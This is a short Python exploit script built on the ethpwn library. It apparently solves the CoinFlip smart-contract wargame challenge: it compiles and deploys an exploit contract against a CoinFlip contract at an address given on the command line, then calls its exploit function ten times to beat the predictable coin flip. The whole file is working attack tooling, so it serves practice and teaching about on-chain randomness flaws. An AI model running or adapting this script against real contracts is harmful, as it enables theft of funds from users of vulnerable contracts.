#!/usr/bin/env python3

import sys
from time import sleep
from ethpwn import *

context.log_level = 'DEBUG'

PROXY_ADDR = sys.argv[1]

CONTRACT_METADATA.compile_solidity_files(['./exploit.sol'])

coin_flip = CONTRACT_METADATA['CoinFlip'].get_contract_at(PROXY_ADDR)

with CONTRACT_METADATA['ExpCoinFlip'].deploy_destructible(PROXY_ADDR) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")

    for i in range(10):
        sleep(2)
        tx_hash, tx_receipt = transact(target.functions.exploit())
        print(f"{i}: Received exploit receipt (block_number={tx_receipt['blockNumber']})")